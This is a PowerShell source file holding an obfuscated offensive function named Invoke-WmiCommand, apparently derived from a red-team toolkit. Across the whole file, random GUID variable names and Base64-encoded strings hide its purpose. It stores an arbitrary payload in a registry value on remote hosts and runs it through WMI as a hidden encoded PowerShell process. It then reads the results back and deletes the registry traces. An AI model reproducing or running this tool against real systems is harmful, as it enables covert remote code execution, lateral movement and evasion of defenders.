function Invoke-WmiCommand {
    [CmdletBinding()]
    Param (
        [Parameter( Mandatory = $True )]
        [ScriptBlock]
        ${b829d8b4107f434489f2a24e98166fab},
        [String]
        [ValidateSet( 'HKEY_LOCAL_MACHINE',
                      'HKEY_CURRENT_USER',
                      'HKEY_CLASSES_ROOT',
                      'HKEY_USERS',
                      'HKEY_CURRENT_CONFIG' )]
        ${ee57e92372e34252addbc38755677dc9} = 'HKEY_CURRENT_USER',
        [String]
        [ValidateNotNullOrEmpty()]
        ${b8a5821b9cde4d56954db60d168ccd81} = 'SOFTWARE\Microsoft\Cryptography\RNG',
        [String]
        [ValidateNotNullOrEmpty()]
        ${c9f7dd28a10745b8a1a5785bc1317b82} = 'Seed',
        [String]
        [ValidateNotNullOrEmpty()]
        ${a03b076451d54aaea1ec6e9ced35d761} = 'Value',
        [Parameter( ValueFromPipeline = $True )]
        [Alias('Cn')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        ${ba926e6e7cc04ac5bf9e8c1ee609261e} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c067abdf1bfb4621b133d399cd264630} = [Management.Automation.PSCredential]::Empty,
        [Management.ImpersonationLevel]
        ${b2989c629f4c41fbb00f7035b2d94a16},
        [System.Management.AuthenticationLevel]
        ${a6bacf4b8368429992f3730d67f0ed9d},
        [Switch]
        ${c40c652725c64295b000687f5ca244ce},
        [String]
        ${aa41c72ec3fb44dab2fad3e4f3c1306d}
    )
    BEGIN {
        switch (${ee57e92372e34252addbc38755677dc9}) {
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUA'))) { ${7f8c6bf1e0474106952c6799cf745270} = 2147483650 }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEUAWQBfAEMAVQBSAFIARQBOAFQAXwBVAFMARQBSAA=='))) { ${7f8c6bf1e0474106952c6799cf745270} = 2147483649 }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEUAWQBfAEMATABBAFMAUwBFAFMAXwBSAE8ATwBUAA=='))) { ${7f8c6bf1e0474106952c6799cf745270} = 2147483648 }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEUAWQBfAFUAUwBFAFIAUwA='))) { ${7f8c6bf1e0474106952c6799cf745270} = 2147483651 }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEUAWQBfAEMAVQBSAFIARQBOAFQAXwBDAE8ATgBGAEkARwA='))) { ${7f8c6bf1e0474106952c6799cf745270} = 2147483653 }
        }
        ${2a8ed39a52f4476595a097347215a204} = 2147483650
        ${457de8c0b140457c862387582cb1823c} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${457de8c0b140457c862387582cb1823c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = ${c067abdf1bfb4621b133d399cd264630} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA=')))]) { ${457de8c0b140457c862387582cb1823c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA=')))] = ${b2989c629f4c41fbb00f7035b2d94a16} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAA==')))]) { ${457de8c0b140457c862387582cb1823c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAA==')))] = ${a6bacf4b8368429992f3730d67f0ed9d} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGEAYgBsAGUAQQBsAGwAUAByAGkAdgBpAGwAZQBnAGUAcwA=')))]) { ${457de8c0b140457c862387582cb1823c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGEAYgBsAGUAQQBsAGwAUAByAGkAdgBpAGwAZQBnAGUAcwA=')))] = ${c40c652725c64295b000687f5ca244ce} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIAaQB0AHkA')))]) { ${457de8c0b140457c862387582cb1823c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIAaQB0AHkA')))] = ${aa41c72ec3fb44dab2fad3e4f3c1306d} }
        ${60b69a64f1bf4c349d8ea98f30ee648c} = @{
            KEY_QUERY_VALUE = 1
            KEY_SET_VALUE = 2
            KEY_CREATE_SUB_KEY = 4
            KEY_CREATE = 32
            DELETE = 65536
        }
        ${779eed4e673b417abfb01cb41cf5cd08} = ${60b69a64f1bf4c349d8ea98f30ee648c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBFAFkAXwBRAFUARQBSAFkAXwBWAEEATABVAEUA')))] -bor
                               ${60b69a64f1bf4c349d8ea98f30ee648c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBFAFkAXwBTAEUAVABfAFYAQQBMAFUARQA=')))] -bor
                               ${60b69a64f1bf4c349d8ea98f30ee648c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBFAFkAXwBDAFIARQBBAFQARQBfAFMAVQBCAF8ASwBFAFkA')))] -bor
                               ${60b69a64f1bf4c349d8ea98f30ee648c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBFAFkAXwBDAFIARQBBAFQARQA=')))] -bor
                               ${60b69a64f1bf4c349d8ea98f30ee648c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAEwARQBUAEUA')))]
    }
    PROCESS {
        foreach ($Computer in ${ba926e6e7cc04ac5bf9e8c1ee609261e}) {
            ${457de8c0b140457c862387582cb1823c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))] = $Computer
            Write-Verbose "[$Computer] Creating the following registry key: ${ee57e92372e34252addbc38755677dc9}\${b8a5821b9cde4d56954db60d168ccd81}"
            ${279cb454c2e443a9a14d056e1ff41a4d} = Invoke-WmiMethod @457de8c0b140457c862387582cb1823c -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUASwBlAHkA'))) -ArgumentList ${7f8c6bf1e0474106952c6799cf745270}, ${b8a5821b9cde4d56954db60d168ccd81}
            if (${279cb454c2e443a9a14d056e1ff41a4d}.ReturnValue -ne 0) {
                throw "[$Computer] Unable to create the following registry key: ${ee57e92372e34252addbc38755677dc9}\${b8a5821b9cde4d56954db60d168ccd81}"
            }
            Write-Verbose "[$Computer] Validating read/write/delete privileges for the following registry key: ${ee57e92372e34252addbc38755677dc9}\${b8a5821b9cde4d56954db60d168ccd81}"
            ${279cb454c2e443a9a14d056e1ff41a4d} = Invoke-WmiMethod @457de8c0b140457c862387582cb1823c -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAEEAYwBjAGUAcwBzAA=='))) -ArgumentList ${7f8c6bf1e0474106952c6799cf745270}, ${b8a5821b9cde4d56954db60d168ccd81}, ${779eed4e673b417abfb01cb41cf5cd08}
            if (-not ${279cb454c2e443a9a14d056e1ff41a4d}.bGranted) {
                throw "[$Computer] You do not have permission to perform all the registry operations necessary for Invoke-WmiCommand."
            }
            ${8906be79882545ac9180ca3445bade56} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAMQBcAFMAaABlAGwAbABJAGQAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AC4AUABvAHcAZQByAFMAaABlAGwAbAA=')))
            ${0168d713deb74d75b3f1f71b4f872e7e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))
            ${279cb454c2e443a9a14d056e1ff41a4d} = Invoke-WmiMethod @457de8c0b140457c862387582cb1823c -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${2a8ed39a52f4476595a097347215a204}, ${8906be79882545ac9180ca3445bade56}, ${0168d713deb74d75b3f1f71b4f872e7e}
            if (${279cb454c2e443a9a14d056e1ff41a4d}.ReturnValue -ne 0) {
                throw "[$Computer] Unable to obtain powershell.exe path from the following registry value: HKEY_LOCAL_MACHINE\${8906be79882545ac9180ca3445bade56}\${0168d713deb74d75b3f1f71b4f872e7e}"
            }
            ${6708990988854da996f0047df54da77e} = ${279cb454c2e443a9a14d056e1ff41a4d}.sValue
            Write-Verbose "[$Computer] Full PowerShell path: ${6708990988854da996f0047df54da77e}"
            ${27f99395791c4ee2b7b06ba2cfa73dea} = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(${b829d8b4107f434489f2a24e98166fab}))
            Write-Verbose "[$Computer] Storing the payload into the following registry value: ${ee57e92372e34252addbc38755677dc9}\${b8a5821b9cde4d56954db60d168ccd81}\${c9f7dd28a10745b8a1a5785bc1317b82}"
            ${279cb454c2e443a9a14d056e1ff41a4d} = Invoke-WmiMethod @457de8c0b140457c862387582cb1823c -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${7f8c6bf1e0474106952c6799cf745270}, ${b8a5821b9cde4d56954db60d168ccd81}, ${27f99395791c4ee2b7b06ba2cfa73dea}, ${c9f7dd28a10745b8a1a5785bc1317b82}
            if (${279cb454c2e443a9a14d056e1ff41a4d}.ReturnValue -ne 0) {
                throw "[$Computer] Unable to store the payload in the following registry value: ${ee57e92372e34252addbc38755677dc9}\${b8a5821b9cde4d56954db60d168ccd81}\${c9f7dd28a10745b8a1a5785bc1317b82}"
            }
            ${7d69ebf6d4df4bba851f27cd3ce3c25a} = @"
                `$Hive = '${7f8c6bf1e0474106952c6799cf745270}'
                `$RegistryKeyPath = '${b8a5821b9cde4d56954db60d168ccd81}'
                `$RegistryPayloadValueName = '${c9f7dd28a10745b8a1a5785bc1317b82}'
                `$RegistryResultValueName = '${a03b076451d54aaea1ec6e9ced35d761}'
                `n
"@
            ${8ddd5d4bd3514330b637ceece32df4bf} = ${7d69ebf6d4df4bba851f27cd3ce3c25a} + {
                ${457de8c0b140457c862387582cb1823c} = @{
                    Namespace = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                    Class = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                }
                ${279cb454c2e443a9a14d056e1ff41a4d} = Invoke-WmiMethod @457de8c0b140457c862387582cb1823c -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${7f8c6bf1e0474106952c6799cf745270}, ${b8a5821b9cde4d56954db60d168ccd81}, ${c9f7dd28a10745b8a1a5785bc1317b82}
                if ((${279cb454c2e443a9a14d056e1ff41a4d}.ReturnValue -eq 0) -and (${279cb454c2e443a9a14d056e1ff41a4d}.sValue)) {
                    ${b829d8b4107f434489f2a24e98166fab} = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(${279cb454c2e443a9a14d056e1ff41a4d}.sValue))
                    ${6b4ded6aa38b4a4ab19f37298f8181f6} = [IO.Path]::GetTempFileName()
                    ${8b6291881c2640e9992b5bf7e1fd3a5c} = iex (${b829d8b4107f434489f2a24e98166fab})
                    Export-Clixml -InputObject ${8b6291881c2640e9992b5bf7e1fd3a5c} -Path ${6b4ded6aa38b4a4ab19f37298f8181f6}
                    ${96fe6c08ff7247f79437340dd1052864} = [IO.File]::ReadAllText(${6b4ded6aa38b4a4ab19f37298f8181f6})
                    $null = Invoke-WmiMethod @457de8c0b140457c862387582cb1823c -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${7f8c6bf1e0474106952c6799cf745270}, ${b8a5821b9cde4d56954db60d168ccd81}, ${96fe6c08ff7247f79437340dd1052864}, ${a03b076451d54aaea1ec6e9ced35d761}
                    rd -Path ${d179441aac564156b181a4f2548622c0} -Force
                    $null = Invoke-WmiMethod @457de8c0b140457c862387582cb1823c -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAVgBhAGwAdQBlAA=='))) -ArgumentList ${7f8c6bf1e0474106952c6799cf745270}, ${b8a5821b9cde4d56954db60d168ccd81}, ${c9f7dd28a10745b8a1a5785bc1317b82}
                }
            }
            ${16d25a427e11479caec293ff490244a4} = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(${8ddd5d4bd3514330b637ceece32df4bf}))
            ${a52ada24d02b4e228879fc0725ebc3a4} = "${6708990988854da996f0047df54da77e} -WindowStyle Hidden -NoProfile -EncodedCommand ${16d25a427e11479caec293ff490244a4}"
            ${279cb454c2e443a9a14d056e1ff41a4d} = Invoke-WmiMethod @457de8c0b140457c862387582cb1823c -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGMAaQBtAHYAMgA='))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUA'))) -ArgumentList ${a52ada24d02b4e228879fc0725ebc3a4}
            sleep -Seconds 5
            if (${279cb454c2e443a9a14d056e1ff41a4d}.ReturnValue -ne 0) {
                throw "[$Computer] Unable to execute payload stored within the following registry value: ${ee57e92372e34252addbc38755677dc9}\${b8a5821b9cde4d56954db60d168ccd81}\${c9f7dd28a10745b8a1a5785bc1317b82}"
            }
            Write-Verbose "[$Computer] Payload successfully executed from: ${ee57e92372e34252addbc38755677dc9}\${b8a5821b9cde4d56954db60d168ccd81}\${c9f7dd28a10745b8a1a5785bc1317b82}"
            ${279cb454c2e443a9a14d056e1ff41a4d} = Invoke-WmiMethod @457de8c0b140457c862387582cb1823c -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${7f8c6bf1e0474106952c6799cf745270}, ${b8a5821b9cde4d56954db60d168ccd81}, ${a03b076451d54aaea1ec6e9ced35d761}
            if (${279cb454c2e443a9a14d056e1ff41a4d}.ReturnValue -ne 0) {
                throw "[$Computer] Unable retrieve the payload results from the following registry value: ${ee57e92372e34252addbc38755677dc9}\${b8a5821b9cde4d56954db60d168ccd81}\${a03b076451d54aaea1ec6e9ced35d761}"
            }
            Write-Verbose "[$Computer] Payload results successfully retrieved from: ${ee57e92372e34252addbc38755677dc9}\${b8a5821b9cde4d56954db60d168ccd81}\${a03b076451d54aaea1ec6e9ced35d761}"
            ${d179441aac564156b181a4f2548622c0} = ${279cb454c2e443a9a14d056e1ff41a4d}.sValue
            ${6b4ded6aa38b4a4ab19f37298f8181f6} = [IO.Path]::GetTempFileName()
            Out-File -InputObject ${d179441aac564156b181a4f2548622c0} -FilePath ${6b4ded6aa38b4a4ab19f37298f8181f6}
            ${8b6291881c2640e9992b5bf7e1fd3a5c} = Import-Clixml -Path ${6b4ded6aa38b4a4ab19f37298f8181f6}
            rd -Path ${6b4ded6aa38b4a4ab19f37298f8181f6}
            ${b2918fca85814af08ebac572c21baa93} = New-Object PSObject -Property @{
                PSComputerName = $Computer
                PayloadOutput = ${8b6291881c2640e9992b5bf7e1fd3a5c}
            }
            Write-Verbose "[$Computer] Removing the following registry value: ${ee57e92372e34252addbc38755677dc9}\${b8a5821b9cde4d56954db60d168ccd81}\${a03b076451d54aaea1ec6e9ced35d761}"
            $null = Invoke-WmiMethod @457de8c0b140457c862387582cb1823c -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAVgBhAGwAdQBlAA=='))) -ArgumentList ${7f8c6bf1e0474106952c6799cf745270}, ${b8a5821b9cde4d56954db60d168ccd81}, ${a03b076451d54aaea1ec6e9ced35d761}
            Write-Verbose "[$Computer] Removing the following registry key: ${ee57e92372e34252addbc38755677dc9}\${b8a5821b9cde4d56954db60d168ccd81}"
            $null = Invoke-WmiMethod @457de8c0b140457c862387582cb1823c -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUASwBlAHkA'))) -ArgumentList ${7f8c6bf1e0474106952c6799cf745270}, ${b8a5821b9cde4d56954db60d168ccd81}
            return ${b2918fca85814af08ebac572c21baa93}
        }
    }
}
